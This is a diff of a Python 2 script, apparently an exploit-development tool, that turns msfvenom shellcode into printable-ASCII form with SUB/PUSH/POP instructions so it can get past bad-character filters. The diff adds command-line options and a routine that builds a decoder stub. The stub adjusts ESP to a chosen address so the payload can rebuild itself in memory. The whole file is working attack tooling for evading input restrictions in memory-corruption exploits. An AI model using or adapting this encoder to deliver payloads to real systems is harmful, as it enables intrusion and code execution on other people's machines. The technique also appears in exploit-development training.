@@ -1,11 +1,29 @@
 import sys
 import string
+import optparse 
 
-if(len(sys.argv)!=2):
-	sys.exit("[!] Please give valid filename!")
+header  = "#"*50+"\n"
+header += "$ SUB/PUSH/POP based ASCII shellcode encoder."+"\n"
+header += "$ This technique was originally used by Mati Aharoni (@muts) for bypassing limited character set."+"\n"
+header += "$ Script takes msfvenom output in C format and creates full ascii version by using SUB/PUSH/POP instructions."+"\n"
+header += "$ You should provide ESP and memory location where shellcode will be decoded."+"\n"
+header += "$ Use '--stub true' to add this."+"\n"
+header += "(($)) Written by Abdulla Ismayilov (@infosec_prof)"+"\n"
+header += "#"*50+"\n\n"
+
+parser = optparse.OptionParser(header+"usage: python "+sys.argv[0]+" -f <shellcode file to encode> -b <bad chars>")
+parser.add_option('-b','--bad',dest='bad_chars',type='string', help='Bad characters to avoid in \\x format')
+parser.add_option('-f','--file',dest='filename',type='string', help='Shellcode text file to encode in \\x format')
+parser.add_option('-s','--stub',dest='stub',type='string', help='Creating Stub for Shellcode')
+(options,args) = parser.parse_args()
 
 
-filename = sys.argv[1]
+if(options.filename == None):
+	print parser.usage
+	sys.exit(0)
+
+
+filename = options.filename
 
 def readbytes(filename):
 	chunks = []
@@ -39,17 +57,25 @@ def readbytes(filename):
 		chunks.append(temp_data)
    
 	return chunks
-   
+ 
+
+#print  readbytes(filename)
+#sys.exit(0)
 
 def tohex(val, nbits):
 	return hex((val + (1 << nbits)) % (1 << nbits))
 
-def encode():
+def encode(user_input=None):
 	final_out = ""
 	qaliq = []
 	all_chars = range(32,128)
 	compl = []
-	chunks = readbytes(filename)
+	if(user_input is not None):
+		chunks = user_input
+		#sys.exit(0)
+	else:
+		chunks = readbytes(filename)
+	
 	for ch in chunks:
 		ins = "[1][2][3][4]\n[5][6][7][8]\n[9][10][11][12]\n"
 		complement = tohex(0-int(ch,16),64)[10:][:-1]
@@ -185,7 +211,47 @@ def encode():
 def chunkstring(string, length):
     return (string[0+i:length+i] for i in range(0, len(string), length))
 
+	
+
+print header
+	
 shellcode = ""
+
+if(options.stub is not None):
+	esp = raw_input("[?] Please give ESP value as input: ")
+	# esp = "12fad53a"
+	# esp = "12011005"
+	ret_addr = raw_input("[?] Please provide where to write: ")
+	# ret_addr = "12ffde5a"
+	# substract = tohex(0-(int(ret_addr, 16) - int(esp, 16)),60)[:-1][2:][7:]
+	substract = tohex(0-(int(esp, 16) - int(ret_addr, 16)),60)[:-1][2:]
+	# print substract
+	t_s = []
+	t_s.append(substract)
+	res = encode(t_s)
+	
+	res = res.replace("|","")
+	res = res.split("\n")
+	del res[len(res)-1]
+	#print res
+	# print res
+	shellcode += "\\x25\\x4a\\x4d\\x4e\\x55"
+	shellcode += "\\x25\\x35\\x32\\x31\\x2a"
+	shellcode += "\\x54"
+	shellcode += "\\x58"
+	
+	for stubs in res:
+		chunk_st = list(reversed(list(chunkstring(stubs,2))))
+		shellcode += "\\x2d"
+		for st in chunk_st:
+			shellcode += "\\x"+st
+	shellcode += "\\x50"
+	shellcode += "\\x5c"
+	
+	#print shellcode
+	#sys.exit(0)
+	
+	
 ascii_values = encode()
 ascii_values = ascii_values.split("|")
 #print ascii_values
@@ -214,14 +280,10 @@ for counterparts in ascii_values:
 	shellcode += "\\x41"*2
 	
 
-print "#"*90
-print "$ SUB/PUSH/POP based ASCII shellcode encoder."
-print "$ This technique was originally used by Mati Aharoni (@muts) for bypassing limited character set."
-print "$ Script takes msfvenom output in C format and creates full ascii version by using SUB/PUSH/POP instructions."
-print "$ Encoded shellcode does not jump to decoded version on stack and you should adjust ESP before putting it."
-print "(($)) Written by Abdulla Ismayilov (@infosec_prof)"
+#12fa5119
+#print encode(['1951fa12'])
 
-print "#"*90
+#sys.exit(0)
 
 
 print "[*] Generated shellcode [Python format]: \n"
@@ -249,4 +311,7 @@ print "\n"+"*"*50+"\n"
 print "[*] Original size: "+ str(size_orig)
 print "[*] Encoded  size: "+ str(len(ascii_sh)/2)
 
-
+if(options.stub is None):
+	print "\n"
+	print "***WARNING***"
+	print "[-] Stub is not generated! Shellcode cannot decode itself without that. Either manually add stub to shellcode (by decreasing ESP) or use script with '--stub true' arguments to create stub.\n"
